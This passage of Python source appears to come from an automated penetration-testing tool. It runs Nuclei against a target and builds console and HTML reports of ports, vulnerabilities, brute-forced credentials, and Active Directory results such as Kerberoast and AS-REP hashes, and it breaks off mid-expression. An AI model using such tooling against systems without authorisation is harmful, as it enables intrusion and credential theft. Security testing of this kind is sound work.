        print_info("Running: sudo apt-get install -y nuclei")
        subprocess.run(["sudo", "apt-get", "install", "-y", "nuclei"], check=True)
        if check_nuclei():
            print_good("Nuclei installed successfully.")
            return True
        print_error("The installation appears to have failed.")
        return False
    except Exception as e:
        print_error(f"Could not install Nuclei: {e}")
        return False

def run_nuclei_scan(target, session=None):
    """Runs Nuclei against the target and stores results in SCAN_DATA."""
    print_phase("VULNERABILITY ANALYSIS")
    nuclei_path = check_nuclei()
    if not nuclei_path:
        if not install_nuclei():
            print_warning("Skipping Nuclei analysis.")
            return None
        nuclei_path = check_nuclei()
        if not nuclei_path:
            return None

    print_info(f"Running Nuclei against {target}...")
    findings = []
    process = None
    json_path = None
    try:
        with tempfile.NamedTemporaryFile(suffix=".jsonl", delete=False) as tmp_json:
            json_path = tmp_json.name
        # Use -jsonl-export (JSON Lines, one JSON object per finding) for robustness.
        cmd = [nuclei_path, "-u", target, "-jsonl-export", json_path]
        cmd = _append_nuclei_session_headers(cmd, session)
        if session and _external_http_headers_from_session(session):
            print_info("Nuclei will use headers/cookies from the authenticated session.")
        # IMPORTANT: stdout in binary mode to avoid UnicodeDecodeError with
        # non-UTF-8 banners/symbols emitted by Nuclei. Decode tolerantly.
        # Filter noisy Interactsh backend lines (corrupt bytes in stderr).
        NOISE_PATTERNS = (
            b"Could not unmarshal interaction data",
        )
        def _stream(proc):
            for raw_line in iter(proc.stdout.readline, b""):
                if any(pat in raw_line for pat in NOISE_PATTERNS):
                    continue
                try:
                    print(raw_line.decode("utf-8", errors="replace"), end='')
                except Exception:
                    pass
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        _stream(process)
        process.wait()

        # If this Nuclei version does not support -jsonl-export, retry with -json-export
        if (not os.path.isfile(json_path) or os.path.getsize(json_path) == 0):
            try:
                cmd_alt = [nuclei_path, "-u", target, "-json-export", json_path]
                cmd_alt = _append_nuclei_session_headers(cmd_alt, session)
                proc2 = subprocess.Popen(cmd_alt, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                _stream(proc2)
                proc2.wait()
            except Exception:
                pass

        # Read generated JSON/JSONL robustly (one JSON object per line
        # or a full JSON array depending on the version)
        if os.path.isfile(json_path) and os.path.getsize(json_path) > 0:
            with open(json_path, "rb") as f:
                content = f.read().decode("utf-8", errors="ignore").strip()
            # Caso 1: array JSON
            if content.startswith("["):
                try:
                    arr = json.loads(content)
                    if isinstance(arr, list):
                        for data in arr:
                            if isinstance(data, dict) and (data.get('template-id') or data.get('templateID')):
                                findings.append(data)
                except Exception:
                    pass
            # Case 2: JSONL (one entry per line)
            if not findings:
                for line in content.splitlines():
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        data = json.loads(line)
                        if isinstance(data, dict) and (data.get('template-id') or data.get('templateID')):
                            findings.append(data)
                    except Exception:
                        continue
    except KeyboardInterrupt:
        if process:
            process.terminate()
        print_warning("Nuclei interrupted by the user.")
        return []
    except Exception as e:
        print_error(f"Error running Nuclei: {e}")
        return []
    finally:
        if json_path:
            try:
                os.unlink(json_path)
            except Exception:
                pass

    # Normalize findings to a stable report format
    def _extract(item):
        info = item.get('info') if isinstance(item.get('info'), dict) else {}
        return {
            'template_id': item.get('template-id') or item.get('templateID') or item.get('template') or 'unknown',
            'name': info.get('name') or item.get('name') or '',
            'severity': (info.get('severity') or item.get('severity') or 'unknown').lower(),
            'url': item.get('matched-at') or item.get('host') or item.get('url') or '',
            'type': item.get('type') or info.get('type') or '',
            'tags': info.get('tags') or [],
            'description': (info.get('description') or '').strip(),
            'reference': info.get('reference') or [],
        }

    SEV_ORDER = {'critical': 0, 'high': 1, 'medium': 2, 'low': 3, 'info': 4, 'unknown': 5}
    SEV_COLOR = {
        'critical': Fore.MAGENTA, 'high': Fore.RED, 'medium': Fore.YELLOW,
        'low': Fore.CYAN, 'info': Fore.WHITE, 'unknown': Fore.WHITE,
    }

    # Deduplicate by (template_id, url, severity) — Nuclei can emit the same
    # finding multiple times (for example, missing security headers, one per header).
    normalized = []
    seen_dedup = set()
    for it in findings:
        ext = _extract(it)
        key = (ext['template_id'], ext['url'], ext['severity'])
        if key in seen_dedup:
            continue
        seen_dedup.add(key)
        normalized.append(ext)
    normalized.sort(key=lambda x: (SEV_ORDER.get(x['severity'], 99), x['template_id']))

    # Severity summary
    summary = {}
    for n in normalized:
        summary.setdefault(n['severity'], []).append(n['template_id'])

    print_info(f"Total vulnerabilities detected by Nuclei: {len(normalized)}")
    if normalized:
        # Summary table by severity
        sum_rows = []
        for sev in sorted(summary.keys(), key=lambda s: SEV_ORDER.get(s, 99)):
            unique_str = ', '.join(sorted(set(summary[sev])))
            display = unique_str if len(unique_str) <= 100 else unique_str[:97] + '...'
            color = SEV_COLOR.get(sev, Fore.WHITE)
            sum_rows.append([
                f"{color}{sev.upper()}{Style.RESET_ALL}",
                str(len(summary[sev])),
                display,
            ])
        print_table(
            headers=["Severity", "Count", "Unique templates"],
            rows=sum_rows,
            alignments=['<', '>', '<'],
            title="Vulnerability summary by severity:",
        )

        # Relevant findings table (critical/high/medium/low)
        relevant = [n for n in normalized if n['severity'] in ('critical', 'high', 'medium', 'low')]
        if relevant:
            rel_rows = []
            for n in relevant[:50]:
                color = SEV_COLOR.get(n['severity'], Fore.WHITE)
                rel_rows.append([
                    f"{color}{n['severity'].upper()}{Style.RESET_ALL}",
                    n['template_id'],
                    n['name'] or '-',
                    n['url'] or '-',
                ])
            print_table(
                headers=["Severity", "Template", "Name", "URL"],
                rows=rel_rows,
                alignments=['<', '<', '<', '<'],
                title="Findings relevantes:",
            )
            if len(relevant) > 50:
                print(f"  ... and {len(relevant) - 50} more relevant findings (see report)")

        # Persist each finding in FINDINGS so it appears in TXT/HTML
        for n in normalized:
            FINDINGS.append(
                f"[NUCLEI:{n['severity'].upper()}] {n['template_id']}"
                + (f" — {n['name']}" if n['name'] else "")
                + (f" @ {n['url']}" if n['url'] else "")
            )
    else:
        print("\nNo vulnerabilities detected with Nuclei.")

    # Store details and summary in SCAN_DATA
    if 'nuclei_findings' not in SCAN_DATA or not isinstance(SCAN_DATA['nuclei_findings'], list):
        SCAN_DATA['nuclei_findings'] = []
    SCAN_DATA['nuclei_findings'].extend(normalized)

    if 'nuclei_summary' not in SCAN_DATA or not isinstance(SCAN_DATA['nuclei_summary'], dict):
        SCAN_DATA['nuclei_summary'] = {}
    for sev, tids in summary.items():
        if sev not in SCAN_DATA['nuclei_summary']:
            SCAN_DATA['nuclei_summary'][sev] = []
        prev = set(SCAN_DATA['nuclei_summary'][sev])
        nuevos = [tid for tid in tids if tid not in prev]
        SCAN_DATA['nuclei_summary'][sev].extend(nuevos)
        SCAN_DATA['nuclei_summary'][sev] = list(sorted(set(SCAN_DATA['nuclei_summary'][sev])))
    return normalized

def print_info(msg):
    print(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} {msg}")

def print_good(msg):
    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {msg}")

def print_warning(msg):
    print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} {msg}")

def print_error(msg):
    print(f"{Fore.RED}[-]{Style.RESET_ALL} {msg}")

def print_vuln(msg):
    FINDINGS.append(f"[VULN] {msg}")
    print(f"{Fore.MAGENTA}[VULN]{Style.RESET_ALL} {msg}")

def print_phase(title):
    """Print a phase header: [INFO] ======= TITLE ======= with spacing above and below."""
    print()
    print(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} ======= {title} =======")
    print()

# Regex to ignore ANSI codes when measuring visible width
_ANSI_RE = re.compile(r'\x1b\[[0-9;]*[A-Za-z]')
_BOX_DRAWING_FALLBACK = str.maketrans({
    chr(0x2500): "-",
    chr(0x2502): "|",
    chr(0x250c): "+",
    chr(0x2510): "+",
    chr(0x2514): "+",
    chr(0x2518): "+",
    chr(0x251c): "+",
    chr(0x2524): "+",
    chr(0x252c): "+",
    chr(0x2534): "+",
    chr(0x253c): "+",
})

def _safe_print_line(text=""):
    try:
        print(text)
    except UnicodeEncodeError:
        encoding = sys.stdout.encoding or "utf-8"
        fallback = str(text).translate(_BOX_DRAWING_FALLBACK)
        fallback = fallback.encode(encoding, errors="replace").decode(encoding, errors="replace")
        sys.stdout.write(fallback + os.linesep)

def _visible_len(s):
    return len(_ANSI_RE.sub('', str(s)))

def _pad_cell(cell, width, align='<'):
    """Pad a cell to the given width, ignoring ANSI codes for calculation."""
    cell_str = str(cell)
    pad = width - _visible_len(cell_str)
    if pad <= 0:
        return cell_str
    if align == '<':
        return cell_str + ' ' * pad
    if align == '>':
        return ' ' * pad + cell_str
    left = pad // 2
    return ' ' * left + cell_str + ' ' * (pad - left)

def print_table(headers, rows, alignments=None, title=None, border_color=None, footer=None):
    """Print a box-drawing table with dynamic widths.

    headers: list[str]
    rows: list[list[str]] (cells may contain ANSI codes)
    alignments: list[str] with '<', '>' or '^' per column (default '<')
    title: cadena opcional encima de la tabla
    footer: cadena opcional debajo de la tabla
    """
    if not headers:
        return
    n_cols = len(headers)
    alignments = alignments or ['<'] * n_cols
    if len(alignments) < n_cols:
        alignments = list(alignments) + ['<'] * (n_cols - len(alignments))
    widths = [len(h) for h in headers]
    for r in rows:
        for i in range(n_cols):
            if i < len(r):
                widths[i] = max(widths[i], _visible_len(r[i]))
    color = border_color if border_color is not None else Fore.CYAN
    rc = Style.RESET_ALL
    top = "┌" + "┬".join("─" * (w + 2) for w in widths) + "┐"
    mid = "├" + "┼".join("─" * (w + 2) for w in widths) + "┤"
    bot = "└" + "┴".join("─" * (w + 2) for w in widths) + "┘"
    if title:
        _safe_print_line(f"\n{color}{title}{rc}")
    _safe_print_line(f"{color}{top}{rc}")
    header_line = " │ ".join(_pad_cell(h, widths[i], alignments[i]) for i, h in enumerate(headers))
    _safe_print_line(f"{color}│{rc} {color}{header_line}{rc} {color}│{rc}")
    _safe_print_line(f"{color}{mid}{rc}")
    for r in rows:
        cells = [
            _pad_cell(r[i] if i < len(r) else '', widths[i], alignments[i])
            for i in range(n_cols)
        ]
        line = f" {color}│{rc} ".join(cells)
        _safe_print_line(f"{color}│{rc} {line} {color}│{rc}")
    _safe_print_line(f"{color}{bot}{rc}")
    if footer:
        _safe_print_line(footer)

def _safe_filename_from_url(target_url):
    """Generate a stable filename from the target URL."""
    parsed = urlparse(target_url or "")
    host = (parsed.netloc or parsed.path or "target").strip().lower()
    path = parsed.path.strip('/') if parsed.netloc else ""
    raw = f"{host}_{path}" if path else host
    safe = re.sub(r'[^a-zA-Z0-9._-]+', '_', raw).strip('._-')
    return safe or "target"

def _default_report_txt_name(target_url):
    return f"{_safe_filename_from_url(target_url)}.txt"

def _normalize_output_paths(output_file, target_url):
    """Return stable paths for TXT/JSON/HTML/MD. Always overwrite per target."""
    # Base reports folder
    reports_dir = os.path.join(os.getcwd(), "reports")
    # Subfolder name by host/url
    host_dir = _safe_filename_from_url(target_url)
    out_dir = os.path.join(reports_dir, host_dir)
    os.makedirs(out_dir, exist_ok=True)
    base_name = _default_report_txt_name(target_url)
    txt_file = os.path.join(out_dir, base_name)
    base, ext = os.path.splitext(txt_file)
    if not ext:
        txt_file = txt_file + ".txt"
        base = txt_file[:-4]
    return txt_file, base + ".json", base + ".html", base + ".md"

def _to_serializable(value):
    """Convierte objetos no serializables (cookies, sets, etc.) en tipos JSON simples."""
    if isinstance(value, (str, int, float, bool)) or value is None:
        return value
    if isinstance(value, dict):
        return {str(k): _to_serializable(v) for k, v in value.items()}
    if isinstance(value, (list, tuple, set)):
        return [_to_serializable(v) for v in value]
    if hasattr(value, 'items'):
        try:
            return {str(k): _to_serializable(v) for k, v in value.items()}
        except Exception:
            pass
    return str(value)

def _html_escape(value):
    return html.escape(str(value), quote=True)

_FINDING_SEV_CAT = {"critical": "VULN", "high": "VULN", "medium": "VULN",
                    "low": "API", "info": "INFO"}

def _finding_text(finding):
    """Normaliza un hallazgo (dict {name,detail,severity} o str legado '[CAT] msg')
    to the canonical string '[CAT] name: detail'. Avoids crashes in TXT reports and
    in the final summary when the finding is a dict."""
    if isinstance(finding, dict):
        cat = _FINDING_SEV_CAT.get((finding.get("severity") or "").lower(), "API")
        name = finding.get("name") or "Hallazgo"
        detail = finding.get("detail") or ""
        return f"[{cat}] {name}: {detail}" if detail else f"[{cat}] {name}"
    return str(finding)

def _build_html_report(report_data):
    """Generate a SaaS-style HTML dashboard report with all collected data."""
    scan_data = report_data.get("scan_data", {}) or {}
    findings = report_data.get("findings", []) or []
    general = scan_data.get("general", {}) or {}
    technologies = general.get("technologies", []) or []
    auth = scan_data.get("authentication", {}) or {}
    nmap_data = scan_data.get("nmap", {}) or {}
    nmap_ports = nmap_data.get("ports", []) or []
    nmap_nse = nmap_data.get("nse_results", []) or []
    nuclei_findings = scan_data.get("nuclei_findings", []) or []
    nuclei_summary = scan_data.get("nuclei_summary", {}) or {}
    vhosts = scan_data.get("vhosts", []) or []
    directories = scan_data.get("directory_hits", []) or []
    api_endpoints = scan_data.get("api_endpoints", []) or []
    users = scan_data.get("users", []) or []
    emails = scan_data.get("emails", []) or []
    creds = scan_data.get("bruteforce_credentials", []) or []
    wordpress = scan_data.get("wordpress", {}) or {}
    spider = scan_data.get("spider", {}) or {}
    src_code = scan_data.get("source_code_analysis", {}) or {}
    src_findings = src_code.get("findings", []) or []
    active_directory = scan_data.get("active_directory", {}) or {}
    stats = scan_data.get("stats", {}) or {}
    robots_paths = scan_data.get("robots_paths", []) or []
    http_methods = scan_data.get("http_methods", []) or []
    injection = scan_data.get("injection", {}) or {}
    adv_sec = scan_data.get("advanced_security", {}) or {}
    adv_ssrf = adv_sec.get("ssrf") or []
    adv_ssti = adv_sec.get("ssti") or []
    adv_xxe = adv_sec.get("xxe") or []
    adv_crlf = adv_sec.get("crlf") or []
    adv_smuggling = adv_sec.get("smuggling") or []
    adv_cache = adv_sec.get("cache_poisoning") or []
    adv_total = len(adv_ssrf) + len(adv_ssti) + len(adv_xxe) + len(adv_crlf) + len(adv_smuggling) + len(adv_cache)

    def esc(value):
        return _html_escape(value if value is not None else "")

    def badge(value, tone="neutral"):
        text = esc(value if value not in (None, "") else "-")
        return f"<span class='badge badge-{tone}'>{text}</span>"

    def status_badge(value):
        text = str(value if value is not None else "-")
        tone = "neutral"
        if text.startswith("2") or text.lower() in ("open", "ok", "true", "si", "yes"):
            tone = "good"
        elif text.startswith("3") or "medium" in text.lower():
            tone = "info"
        elif text.startswith("4") or "low" in text.lower():
            tone = "warn"
        elif text.startswith("5") or any(x in text.lower() for x in ("critical", "high", "vulnerable")):
            tone = "bad"
        return badge(text, tone)

    def table(headers, rows, empty="No data.", raw_cols=None, row_attrs=None):
        raw_cols = set(raw_cols or [])
        if not rows:
            return (
                "<div class='table-wrap'><table><thead><tr>"
                + "".join(f"<th>{esc(h)}</th>" for h in headers)
                + "</tr></thead><tbody>"
                + f"<tr><td colspan='{len(headers)}' class='empty'>{esc(empty)}</td></tr>"
                + "</tbody></table></div>"
            )
        body = []
        for i, row in enumerate(rows):
            cells = []
            for idx, cell in enumerate(row):
                if idx in raw_cols:
                    cells.append(f"<td>{cell}</td>")
                else:
                    cells.append(f"<td>{esc(cell)}</td>")
            attr = ""
            if row_attrs and i < len(row_attrs) and row_attrs[i]:
                attr = " " + " ".join(f'{k}="{v}"' for k, v in row_attrs[i].items())
            body.append(f"<tr{attr}>" + "".join(cells) + "</tr>")
        return (
            "<div class='table-wrap'><table><thead><tr>"
            + "".join(f"<th>{esc(h)}</th>" for h in headers)
            + "</tr></thead><tbody>"
            + "".join(body)
            + "</tbody></table></div>"
        )

    def section(sec_id, title, content):
        return f"<section id='{sec_id}' class='section'><div class='section-head'><h2>{esc(title)}</h2></div>{content}</section>"

    def compact_list(items):
        if not items:
            return "<span class='muted'>No data</span>"
        return "<div class='chips'>" + "".join(f"<span class='chip'>{esc(i)}</span>" for i in items) + "</div>"

    def nmap_version(p):
        parts = [p.get("product", ""), p.get("version", ""), p.get("extrainfo", "")]
        return " ".join(x for x in parts if x).strip() or "-"

    sev_rank = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4, "unknown": 5}
    sev_tone = {"critical": "bad", "high": "bad", "medium": "warn", "low": "info", "info": "neutral", "unknown": "neutral"}
    ad_ldap = active_directory.get("ldap") or {}
    ad_nxc = active_directory.get("nxc") or {}
    ad_imp = active_directory.get("impacket") or {}
    asrep_hashes = (ad_imp.get("asrep_roast") or {}).get("hashes", []) or []
    kerberoast_hashes = (ad_imp.get("kerberoast") or {}).get("hashes", []) or []
    ad_creds = ((ad_nxc.get("bruteforce") or {}).get("credentials", []) or [])

    # Combined severity count (Nuclei + source code) for the visual summary
    _sev_known = {"critical", "high", "medium", "low", "info"}
    sev_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
    for n in nuclei_findings:
        s = (n.get("severity") or "info").lower()
        s = s if s in _sev_known else "info"
        sev_counts[s] += 1
    for f in src_findings:
        s = (f.get("severity") or "low").lower()
        s = s if s in _sev_known else "low"
        sev_counts[s] += 1
    sev_total = sum(sev_counts.values())
    risk_score = sev_counts["critical"] * 10 + sev_counts["high"] * 5 + sev_counts["medium"] * 2 + sev_counts["low"]
    if sev_counts["critical"]:
        risk_label, risk_tone = "CRITICAL", "bad"
    elif sev_counts["high"]:
        risk_label, risk_tone = "HIGH", "bad"
    elif sev_counts["medium"]:
        risk_label, risk_tone = "MEDIUM", "warn"
    elif sev_counts["low"] or sev_total:
        risk_label, risk_tone = "LOW", "info"
    else:
        risk_label, risk_tone = "CLEAN", "good"

    kpis = [
        ("Findings", len(findings), "bad" if findings else "neutral", "warning-octagon", "findings"),
        ("Ports", len(nmap_ports), "info", "network", "nmap"),
        ("NSE", len(nmap_nse), "warn" if nmap_nse else "neutral", "scan", "nmap"),
        ("Nuclei", len(nuclei_findings), "bad" if nuclei_findings else "neutral", "bug-beetle", "nuclei"),
        ("Technologies", len(technologies), "good" if technologies else "neutral", "stack", "info"),
        ("Endpoints API", len(api_endpoints), "info", "brackets-curly", "api"),
        ("Directories", len(directories), "info", "folders", "directories"),
        ("Users", len(users), "neutral", "users-three", "info"),
        ("Credentials", len(creds), "bad" if creds else "neutral", "key", "credentials"),
        ("AD users", len(ad_ldap.get("users") or []), "info", "tree-structure", "ad"),
        ("AS-REP", len(asrep_hashes), "bad" if asrep_hashes else "neutral", "fingerprint", "ad"),
        ("Kerberoast", len(kerberoast_hashes), "bad" if kerberoast_hashes else "neutral", "fire", "ad"),
        ("Adv. Security", adv_total, "bad" if adv_total else "neutral", "shield-warning", "advanced"),
    ]
    # Sort the summary by criticality: critical/high -> medium -> info -> ok
    tone_rank = {"bad": 0, "warn": 1, "info": 2, "good": 3, "neutral": 4}
    kpis_shown = sorted((k for k in kpis if k[1]), key=lambda k: tone_rank.get(k[2], 9))
    kpi_html = "<div class='kpis'>" + "".join(
        f"<a class='metric metric-{tone}' href='#{target}'><span><i class='ph ph-{icon}'></i>{esc(label)}</span><strong>{esc(value)}</strong></a>"
        for label, value, tone, icon, target in kpis_shown
    ) + "</div>"

    tech_rows = []
    for item in technologies:
        if isinstance(item, dict):
            tech_rows.append([item.get("name", "-"), item.get("detail", "-"), general.get("technologies_source", "-")])
        else:
            tech_rows.append([str(item), "-", general.get("technologies_source", "-")])

    header_rows = [[k, v] for k, v in (general.get("headers") or {}).items()]
    cookie_rows = [[c] for c in (general.get("cookies") or [])]
    auth_rows = [[
        "Status", status_badge("Authenticated" if auth.get("authenticated") else "Unauthenticated")
    ], [
        "Method", esc(auth.get("method", "-"))
    ], [
        "Login URL", esc(auth.get("login_url", "-"))
    ], [
        "User", esc(auth.get("username", "-"))
    ], [
        "Cookies", esc(", ".join(auth.get("cookie_names") or []) or "-")
    ], [
        "Authorization", esc("Yes" if auth.get("authorization_header") else "No")
    ]]

    overview_content = (
        kpi_html
        + "<div class='grid two'>"
        + "<div class='panel'><h3>Target</h3>"
        + table(["Field", "Value"], [
            ["URL", report_data.get("target", "-")],
            ["Date", report_data.get("date", "-")],
            ["Version", report_data.get("tool", "-")],
            ["HTTP status", general.get("status_code", "-")],
            ["Server", general.get("server", "-")],
        ])
        + "</div>"
        + "<div class='panel'><h3>Authentication</h3>"
        + table(["Field", "Value"], auth_rows, raw_cols={1})
        + "</div></div>"
    )

    def _norm_ident(s):
        return re.sub(r"[^a-z0-9]", "", str(s).lower())

    def users_emails_block(users, emails):
        # Correlates email <-> user by the local part of the email
        pairs, matched_u, matched_e = [], set(), set()
        for u in users:
            un = _norm_ident(u)
            for e in emails:
                local = _norm_ident(str(e).split("@", 1)[0])
                if un and local and (un == local or (len(un) >= 3 and (un in local or local in un))):
                    pairs.append((u, e)); matched_u.add(u); matched_e.add(e)
        if pairs:
            rows = [[f"<code>{esc(u)}</code>", f"<code>{esc(e)}</code>"] for u, e in pairs]
            rows += [[f"<code>{esc(u)}</code>", "<span class='muted'>-</span>"] for u in users if u not in matched_u]
            rows += [["<span class='muted'>-</span>", f"<code>{esc(e)}</code>"] for e in emails if e not in matched_e]
            return "<h4>User &harr; email correlation</h4>" + table(["User", "Email"], rows, raw_cols={0, 1})
        return "<h4>Users</h4>" + compact_list(users) + "<h4>Emails</h4>" + compact_list(emails)

    info_content = (
        "<div class='grid two'>"
        + "<div class='panel'><h3>WhatWeb / Technologies</h3>"
        + table(["Technology", "Detail", "Source"], tech_rows, "No technologies detected.")
        + "</div>"
        + "<div class='panel'><h3>Users and emails</h3>"
        + users_emails_block(users, emails)
        + "</div></div>"
        + "<div class='panel'><h3>HTTP Headers</h3>"
        + table(["Header", "Value"], header_rows, "No headers recorded.")
        + "</div>"
        + "<div class='panel'><h3>Cookies</h3>"
        + table(["Cookie"], cookie_rows, "No cookies recorded.")
        + "</div>"
    )

    nmap_rows = [[
        f"{p.get('port', '-')}/{p.get('protocol', '')}",
        status_badge(p.get("state", "-")),
        p.get("service", "-"),
        nmap_version(p),
        len(p.get("scripts") or []),
    ] for p in nmap_ports if isinstance(p, dict)]
    nse_rows = [[
        f"{item.get('port', '-')}/{item.get('protocol', '')}",
        item.get("service", "-"),
        item.get("script_id", "-"),
        status_badge("interesting" if item.get("interesting") else "info"),
        item.get("output", "-"),
    ] for item in nmap_nse]
    nmap_content = (
        "<div class='panel'><h3>Open ports</h3>"
        + f"<p class='muted'>Initial command: <code>{esc(nmap_data.get('command', 'nmap -sV'))}</code></p>"
        + table(["Port", "Status", "Service", "Version", "Scripts"], nmap_rows, raw_cols={1})
        + "</div><div class='panel'><h3>Targeted NSE</h3>"
        + f"<p class='muted'>NSE command: <code>{esc((nmap_data.get('nse') or {}).get('command', '-'))}</code></p>"
        + table(["Port", "Service", "Script", "Type", "Output"], nse_rows, "No NSE output.", raw_cols={3})
        + "</div>"
    )

    grouped = {}
    for item in findings:
        text = _finding_text(item)
        m = re.match(r'^\[([^\]]+)\]\s*(.*)', text)
        key = m.group(1) if m else "OTHER"
        msg = m.group(2) if m else text
        grouped.setdefault(key, []).append(msg)
    finding_rows = [[cat, len(items), "<br>".join(esc(i) for i in items)] for cat, items in sorted(grouped.items())]
    findings_content = "<div class='panel'>" + table(["Category", "Total", "Detail"], finding_rows, "No findings.", raw_cols={2}) + "</div>"

    nuclei_summary_rows = [[sev.upper(), status_badge(sev.upper()), len(tids), ", ".join(sorted(set(map(str, tids))))] for sev, tids in sorted(nuclei_summary.items(), key=lambda x: sev_rank.get(x[0], 99))]
    _nuclei_sorted = sorted(nuclei_findings, key=lambda x: (sev_rank.get((x.get("severity") or "unknown"), 99), x.get("template_id", "")))
    nuclei_rows = [[
        status_badge((n.get("severity") or "unknown").upper()),
        n.get("template_id", "-"),
        n.get("name", "-"),
        n.get("url", "-"),
        ", ".join(n.get("tags") or []) if isinstance(n.get("tags"), list) else n.get("tags", "-"),
    ] for n in _nuclei_sorted]
    nuclei_row_attrs = [{"data-sev": (n.get("severity") or "info").lower()} for n in _nuclei_sorted]
    nuclei_content = (
        "<div class='panel'><h3>Severity summary</h3>"
        + table(["Severity", "Status", "Total", "Templates"], nuclei_summary_rows, "No Nuclei summary.", raw_cols={1})
        + "</div><div class='panel'><h3>Findings</h3>"
        + table(["Severity", "Template", "Name", "URL", "Tags"], nuclei_rows, "No Nuclei findings.", raw_cols={0}, row_attrs=nuclei_row_attrs)
        + "</div>"
    )

    api_content = "<div class='panel'>" + table(
        ["Status", "Endpoint", "URL", "Content-Type"],
        [[status_badge(ep.get("status", "-")), ep.get("endpoint", "-"), ep.get("url", "-"), ep.get("content_type", "-")] for ep in api_endpoints],
        "No endpoints API.",
        raw_cols={0},
    ) + "</div>"
    vhost_content = "<div class='panel'>" + table(
        ["Status", "VHost", "Size"],
        [[status_badge(v.get("status", "-")), v.get("fqdn") or v.get("subdomain", "-"), v.get("size", "-")] for v in vhosts if isinstance(v, dict)],
        "No vhosts.",
        raw_cols={0},
    ) + "</div>"
    dir_content = "<div class='panel'>" + table(
        ["Status", "URL", "Size"],
        [[status_badge(h.get("status", "-")), h.get("url", "-"), h.get("size", "-")] for h in directories if isinstance(h, dict)],
        "No directories.",
        raw_cols={0},
    ) + "</div>"

    wp_rows = []
    if wordpress:
        wp_rows = [
            ["Detected", "Yes" if wordpress.get("detected") else "Not confirmed"],
            ["Version", (wordpress.get("version") or {}).get("number", "-")],
            ["Theme", (wordpress.get("main_theme") or {}).get("name", "-")],
            ["Plugins", len(wordpress.get("plugins") or [])],
            ["Users", len(wordpress.get("users") or [])],
            ["Vulnerabilities", len(wordpress.get("vulnerabilities") or [])],
            ["Credentials", len(wordpress.get("credentials") or [])],
        ]
    wp_user_rows = [[u.get("username", "-"), u.get("name", "-"), u.get("found_by", "-")] for u in (wordpress.get("users") or []) if isinstance(u, dict)]
    wp_vuln_rows = [[v.get("component_type", "-"), v.get("component", "-"), v.get("title", "-"), v.get("fixed_in", "-")] for v in (wordpress.get("vulnerabilities") or []) if isinstance(v, dict)]
    wp_content = (
        "<div class='panel'><h3>Summary</h3>" + table(["Field", "Value"], wp_rows, "WordPress not run.") + "</div>"
        + "<div class='panel'><h3>Users</h3>" + table(["User", "Name", "Source"], wp_user_rows, "No WordPress users.") + "</div>"
        + "<div class='panel'><h3>Vulnerabilities</h3>" + table(["Type", "Component", "Title", "Fixed in"], wp_vuln_rows, "No WordPress vulnerabilities.") + "</div>"
    )

    spider_content = (
        "<div class='grid two'><div class='panel'><h3>Summary</h3>"
        + table(["Metric", "Value"], [
            ["URLs", spider.get("total_urls", 0)],
            ["Parameters", spider.get("total_params", 0)],
            ["Forms", spider.get("total_forms", 0)],
        ])
        + "</div><div class='panel'><h3>Parameters</h3>"
        + compact_list(spider.get("sample_params") or [])
        + "</div></div><div class='panel'><h3>URLs</h3>"
        + table(["URL"], [[u] for u in (spider.get("sample_urls") or [])], "No URLs de spider.")
        + "</div>"
    )

    _src_sorted = sorted(src_findings, key=lambda x: sev_rank.get((x.get("severity") or "low").lower(), 99))
    src_rows = [[
        status_badge((f.get("severity") or "-").upper()),
        f.get("type", "-"),
        f.get("value", "-"),
        f.get("url", "-"),
        f.get("snippet", "-"),
    ] for f in _src_sorted]
    src_row_attrs = [{"data-sev": (f.get("severity") or "low").lower()} for f in _src_sorted]
    source_content = (
        "<div class='panel'><h3>Summary</h3>"
        + table(["Metric", "Value"], [
            ["Pages analyzed", src_code.get("pages_analyzed", 0)],
            ["Assets analyzed", src_code.get("assets_analyzed", 0)],
            ["Findings", len(src_findings)],
            ["Critical", (src_code.get("summary") or {}).get("critical", 0)],
            ["High", (src_code.get("summary") or {}).get("high", 0)],
            ["Medium", (src_code.get("summary") or {}).get("medium", 0)],
            ["Low", (src_code.get("summary") or {}).get("low", 0)],
        ])
        + "</div><div class='panel'><h3>Detail</h3>"
        + table(["Severity", "Type", "Value", "URL", "Context"], src_rows, "No source-code findings.", raw_cols={0}, row_attrs=src_row_attrs)
        + "</div>"
    )

    ad_summary = []
    if active_directory:
        ad_summary = [
            ["Domain Controller", active_directory.get("target", "-")],
            ["Domain", active_directory.get("domain", "-")],
            ["Base DN", active_directory.get("base_dn", "-")],
            ["Mode", active_directory.get("auth_mode", "-")],
            ["Kerbrute users", len((active_directory.get("kerbrute") or {}).get("valid_users") or [])],
            ["LDAP users", len(ad_ldap.get("users") or [])],
            ["LDAP groups", len(ad_ldap.get("groups") or [])],
            ["LDAP computers", len(ad_ldap.get("computers") or [])],
            ["AS-REP roastable", len(asrep_hashes)],
            ["Kerberoastable SPNs", len(kerberoast_hashes)],
            ["NXC credentials", len(ad_creds)],
        ]
    ad_content = (
        "<div class='panel'><h3>Summary AD</h3>" + table(["Field", "Value"], ad_summary, "AD module not run.") + "</div>"
        + "<div class='panel'><h3>Kerbrute users validos</h3>"
        + table(["User"], [[u] for u in ((active_directory.get("kerbrute") or {}).get("valid_users") or [])], "No Kerbrute users.")
        + "</div><div class='panel'><h3>LDAP users</h3>"
        + table(["User", "UPN", "CN", "Groups"], [[u.get("username", "-"), u.get("upn", "-"), u.get("cn", "-"), ", ".join(u.get("memberOf") or [])] for u in (ad_ldap.get("users") or [])], "No LDAP users.")
        + "</div><div class='panel'><h3>LDAP groups</h3>"
        + table(["Group", "Description", "Members"], [[g.get("name", "-"), g.get("description", "-"), len(g.get("members") or [])] for g in (ad_ldap.get("groups") or [])], "No grupos LDAP.")
        + "</div><div class='panel'><h3>LDAP computers</h3>"
        + table(["Computer", "OS", "Version"], [[c.get("name", "-"), c.get("os", "-"), c.get("os_version", "-")] for c in (ad_ldap.get("computers") or [])], "No LDAP computers.")
        + "</div><div class='panel'><h3>AS-REP Roasting</h3>"
        + table(["User", "Hash"], [[h.get("username", "-"), h.get("hash", "-")] for h in asrep_hashes], "No AS-REP hashes.")
